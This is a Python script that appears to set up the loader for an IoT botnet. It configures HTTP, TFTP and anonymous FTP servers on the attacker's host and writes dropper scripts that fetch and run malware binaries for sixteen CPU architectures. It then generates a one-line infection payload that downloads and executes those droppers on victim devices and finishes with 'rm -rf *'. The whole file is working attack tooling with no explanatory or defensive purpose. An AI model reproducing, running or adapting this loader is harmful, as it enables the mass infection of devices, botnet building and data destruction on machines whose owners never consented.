import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "0x3a13a141f0c"
exec_name = "ssh.exploit"
bin_prefix = "1isequal9."
bin_directory = "Please-Subscribe-To-My-YT-Channel-VegaSec"
archs = [
"x86",                        #1
"mips",                       #2
"mpsl",                       #3
"arm",                        #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4",                        #10
"spc",                        #11
"arc",                        #12
"x86_64",                     #13
"i686",                       #14
"i486",                       #15
"i586"                        #16
]                        



def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[0;31mSetting up...")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')  
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\033[0;31mCreating your payload.")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/catnet.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/catnet.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/catnet.sh')

run('echo "#!/bin/bash" > /var/lib/tftpboot/catnet2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/catnet2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/catnet2.sh')

run('echo "#!/bin/bash" > /var/ftp/catnet1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/catnet1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/catnet1.sh')

run('echo "#!/bin/bash" > /var/www/html/catnet.sh')

for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/www/html/catnet.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/ftp/catnet1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+'; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/catnet.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + '; cat '+bin_prefix+i+' > '+exec_bin+'; chmod +x *; ./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/catnet2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n999999; ulimit -u999999; ulimit -e999999" >> ~/.bashrc')
run
print("\x1b[0;33mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/catnet.sh; curl -O http://" + ip + "/catnet.sh; chmod 777 catnet.sh; sh catnet.sh; tftp " + ip + " -c get catnet.sh; chmod 777 catnet.sh; sh catnet.sh; tftp -r catnet2.sh -g " + ip + "; chmod 777 catnet2.sh; sh catnet2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " catnet1.sh catnet1.sh; sh catnet1.sh; rm -rf catnet.sh catnet.sh catnet2.sh catnet1.sh; rm -rf *\x1b[0m")
print("")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/catnet.sh; curl -O http://" + ip + "/catnet.sh; chmod 777 catnet.sh; sh catnet.sh; tftp " + ip + " -c get catnet.sh; chmod 777 catnet.sh; sh catnet.sh; tftp -r catnet2.sh -g " + ip + "; chmod 777 catnet2.sh; sh catnet2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " catnet1.sh catnet1.sh; sh catnet1.sh; rm -rf catnet.sh catnet.sh catnet2.sh catnet1.sh; rm -rf *")
file = open("payload.txt","w+")
file.write(complete_payload)
file.close()
exit()
raw_input("\033[0;33mYour payload has been generated and saved in payload.txt\033[0m")
